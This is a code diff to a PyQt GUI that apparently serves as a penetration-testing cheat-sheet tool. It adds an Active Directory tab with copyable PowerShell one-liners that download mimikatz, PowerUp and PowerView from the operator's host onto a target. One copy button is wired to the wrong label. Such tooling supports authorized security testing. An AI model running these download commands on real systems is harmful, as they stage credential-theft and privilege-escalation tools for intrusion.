@@ -5666,8 +5666,10 @@ class MainWindow(QMainWindow):
             # Create tabs
             self.wpetab4_1 = QWidget()
             self.wpetab4_2 = QWidget()
+            self.wpetab4_3 = QWidget()
             self.wpetabs.addTab(self.wpetab4_1, "Initial")
             self.wpetabs.addTab(self.wpetab4_2, "Exploit")
+            self.wpetabs.addTab(self.wpetab4_3, "AD")
 
             self.tab4.setLayout(QVBoxLayout())
             self.tab4.layout().addWidget(self.wpetabs)
@@ -11189,7 +11191,7 @@ class MainWindow(QMainWindow):
             self.wpetab4_1_container_layout.addStretch()
 
     #### WinExploit
-            if not hasattr(self, 'wpetab4.2_container'):
+            if not hasattr(self, 'wpetab4_2_container'):
                 self.wpetab4_2_container = QWidget()
                 self.wpetab4_2_container_layout = QVBoxLayout(self.wpetab4_2_container)
                 self.wpetab4_2_container.setLayout(self.wpetab4_2_container_layout)
@@ -11213,7 +11215,6 @@ class MainWindow(QMainWindow):
          
             # winExploit_top_spacer_layout
             self.wpetab4_2_container_layout.insertWidget(0, self.winExploit_top_spacer1)
-            self.wpetab4_2_container_layout.addStretch()
 
         # winExploit_0
             if hasattr(self, 'winExploit_0'):
@@ -11279,7 +11280,6 @@ class MainWindow(QMainWindow):
             label_layout.addWidget(self.winExploit_0_Scan2_Copy)
             label_layout.addWidget(self.winExploit_0_Scan2)
             self.wpetab4_2_container_layout.insertLayout(5, label_layout)
-            self.wpetab4_2_container_layout.addStretch()
          
             # winExploit_0_Scan3
             if hasattr(self, 'winExploit_0_Scan3'):
@@ -11310,7 +11310,6 @@ class MainWindow(QMainWindow):
             label_layout.addWidget(self.winExploit_0_Scan3_Copy)
             label_layout.addWidget(self.winExploit_0_Scan3)
             self.wpetab4_2_container_layout.insertLayout(7, label_layout)
-            self.wpetab4_2_container_layout.addStretch()
          
             # winExploit_0_Scan4
             if hasattr(self, 'winExploit_0_Scan4'):
@@ -11341,7 +11340,6 @@ class MainWindow(QMainWindow):
             label_layout.addWidget(self.winExploit_0_Scan4_Copy)
             label_layout.addWidget(self.winExploit_0_Scan4)
             self.wpetab4_2_container_layout.insertLayout(9, label_layout)
-            self.wpetab4_2_container_layout.addStretch()
 
         # winExploit_0_Scan4_spacer1
             if hasattr(self, 'winExploit_0_Scan4_spacer1'):
@@ -11395,7 +11393,6 @@ class MainWindow(QMainWindow):
             label_layout.addWidget(self.winExploit_0_Scan6_Copy)
             label_layout.addWidget(self.winExploit_0_Scan6)
             self.wpetab4_2_container_layout.insertLayout(13, label_layout)
-            self.wpetab4_2_container_layout.addStretch()
          
             # winExploit_0_Scan7
             if hasattr(self, 'winExploit_0_Scan7'):
@@ -11426,7 +11423,6 @@ class MainWindow(QMainWindow):
             label_layout.addWidget(self.winExploit_0_Scan7_Copy)
             label_layout.addWidget(self.winExploit_0_Scan7)
             self.wpetab4_2_container_layout.insertLayout(15, label_layout)
-            self.wpetab4_2_container_layout.addStretch()
          
             # winExploit_0_divider1
             if hasattr(self, 'winExploit_0_divider1'):
@@ -11469,6 +11465,145 @@ class MainWindow(QMainWindow):
             self.wpetab4_2_container_layout.insertWidget(19, self.winExploit_0_spacer2)
             self.wpetab4_2_container_layout.addStretch()
 
+    #### ActiveDirectory
+            if not hasattr(self, 'wpetab4_3_container'):
+                self.wpetab4_3_container = QWidget()
+                self.wpetab4_3_container_layout = QVBoxLayout(self.wpetab4_3_container)
+                self.wpetab4_3_container.setLayout(self.wpetab4_3_container_layout)
+                self.scroll = QScrollArea()
+                self.scroll.setWidget(self.wpetab4_3_container)
+                self.scroll.setWidgetResizable(True)
+                self.wpetab4_3_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
+                self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
+                self.wpetab4_3_container_layout.setContentsMargins(0,0,0,0)
+                self.wpetab4_3_container.adjustSize()
+                self.wpetab4_3.setLayout(QVBoxLayout())
+                self.wpetab4_3.layout().addWidget(self.scroll)
+
+        # AD_top_spacer1
+            if hasattr(self, 'AD_top_spacer1'):
+                self.wpetab4_3_container_layout.removeWidget(self.AD_top_spacer1)
+                self.AD_top_spacer1.deleteLater()
+            self.AD_top_spacer1 = QLabel()
+            self.AD_top_spacer1.setFixedWidth(40)
+            self.AD_top_spacer1.setFixedHeight(50)
+         
+            # AD_top_spacer_layout
+            self.wpetab4_3_container_layout.insertWidget(0, self.AD_top_spacer1)
+
+        # AD_0
+            if hasattr(self, 'AD_0'):
+                self.wpetab4_3_container_layout.removeWidget(self.AD_0)
+                self.AD_0.deleteLater()
+            self.AD_0 = QLabel("[ + File Transfers ]")
+            self.AD_0.setStyleSheet(
+                "color: #20C20E;" +
+                "font-size: 20px;" +
+                "font-style: 'bold';"
+            )
+            self.wpetab4_3_container_layout.insertWidget(1, self.AD_0)
+
+        # AD_0_Scan1_spacer1
+            if hasattr(self, 'AD_0_Scan1_spacer1'):
+                self.wpetab4_3_container_layout.removeWidget(self.AD_0_Scan1_spacer1)
+                self.AD_0_Scan1_spacer1.deleteLater()
+            self.AD_0_Scan1_spacer1 = QLabel()
+            self.AD_0_Scan1_spacer1.setFixedWidth(40)
+            self.AD_0_Scan1_spacer1.setFixedHeight(0)
+
+            # AD_0_Scan1 spacer & divider layout
+            self.wpetab4_3_container_layout.insertWidget(2, self.AD_0_Scan1_spacer1)
+
+            # AD_0_Scan1
+            if hasattr(self, 'AD_0_Scan1'):
+                self.wpetab4_3_container_layout.removeWidget(self.AD_0_Scan1)
+                self.AD_0_Scan1.deleteLater()
+            self.AD_0_Scan1 = QLabel("powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://" + self.lhost + "/mimikatz.exe', 'mimikatz.exe')")
+            self.AD_0_Scan1.setStyleSheet(
+                "color: 'white';" +
+                "font-size: 20px;" +
+                "font-style: 'bold';"
+            )
+            self.wpetab4_3_container_layout.insertWidget(3,self.AD_0_Scan1)
+         
+         # AD_0_Scan1_Copy
+            if hasattr(self, 'AD_0_Scan1_Copy'):
+                self.wpetab4_3_container_layout.removeWidget(self.AD_0_Scan1_Copy)
+                self.AD_0_Scan1_Copy.deleteLater()
+            self.AD_0_Scan1_Copy = QPushButton()
+            self.AD_0_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+            self.AD_0_Scan1_Copy.setFixedSize(QSize(20,20))
+            self.AD_0_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.AD_0_Scan2.text()))
+            self.AD_0_Scan1_Copy.setStyleSheet(
+                "*:hover{background: '#20C20E';}"
+            )
+         
+            # AD_0_Scan1 adding Widgets
+            label_layout = QHBoxLayout()
+            label_layout.addWidget(self.AD_0_Scan1_Copy)
+            label_layout.addWidget(self.AD_0_Scan1)
+            self.wpetab4_3_container_layout.insertLayout(4, label_layout)
+
+            # AD_0_Scan2
+            if hasattr(self, 'AD_0_Scan2'):
+                self.wpetab4_3_container_layout.removeWidget(self.AD_0_Scan2)
+                self.AD_0_Scan2.deleteLater()
+            self.AD_0_Scan2 = QLabel("powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://" + self.lhost + "/PowerUp.ps1', 'PowerUp.ps1')")
+            self.AD_0_Scan2.setStyleSheet(
+                "color: 'white';" +
+                "font-size: 20px;" +
+                "font-style: 'bold';"
+            )
+            self.wpetab4_3_container_layout.insertWidget(5,self.AD_0_Scan2)
+         
+            # AD_0_Scan2_Copy
+            if hasattr(self, 'AD_0_Scan2_Copy'):
+                self.wpetab4_3_container_layout.removeWidget(self.AD_0_Scan2_Copy)
+                self.AD_0_Scan2_Copy.deleteLater()
+            self.AD_0_Scan2_Copy = QPushButton()
+            self.AD_0_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+            self.AD_0_Scan2_Copy.setFixedSize(QSize(20,20))
+            self.AD_0_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.AD_0_Scan2.text()))
+            self.AD_0_Scan2_Copy.setStyleSheet(
+                "*:hover{background: '#20C20E';}"
+            )
+         
+            # AD_0_Scan2 adding Widgets
+            label_layout = QHBoxLayout()
+            label_layout.addWidget(self.AD_0_Scan2_Copy)
+            label_layout.addWidget(self.AD_0_Scan2)
+            self.wpetab4_3_container_layout.insertLayout(6, label_layout)
+         
+            # AD_0_Scan3
+            if hasattr(self, 'AD_0_Scan3'):
+                self.wpetab4_3_container_layout.removeWidget(self.AD_0_Scan3)
+                self.AD_0_Scan3.deleteLater()
+            self.AD_0_Scan3 = QLabel("powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://" + self.lhost + "/PowerView.ps1', 'PowerView.ps1')")
+            self.AD_0_Scan3.setStyleSheet(
+                "color: 'white';" +
+                "font-size: 20px;" +
+                "font-style: 'bold';"
+            )
+            self.wpetab4_3_container_layout.insertWidget(7,self.AD_0_Scan3)
+         
+            # AD_0_Scan3_Copy
+            if hasattr(self, 'AD_0_Scan3_Copy'):
+                self.wpetab4_3_container_layout.removeWidget(self.AD_0_Scan3_Copy)
+                self.AD_0_Scan3_Copy.deleteLater()
+            self.AD_0_Scan3_Copy = QPushButton()
+            self.AD_0_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+            self.AD_0_Scan3_Copy.setFixedSize(QSize(20,20))
+            self.AD_0_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.AD_0_Scan3.text()))
+            self.AD_0_Scan3_Copy.setStyleSheet(
+                "*:hover{background: '#20C20E';}"
+            )
+         
+            # AD_0_Scan3 adding Widgets
+            label_layout = QHBoxLayout()
+            label_layout.addWidget(self.AD_0_Scan3_Copy)
+            label_layout.addWidget(self.AD_0_Scan3)
+            self.wpetab4_3_container_layout.insertLayout(8, label_layout)
+            self.wpetab4_3_container_layout.addStretch()
 #### TTY
     def tty(self):
         if not hasattr(self, 'tab5_container'):
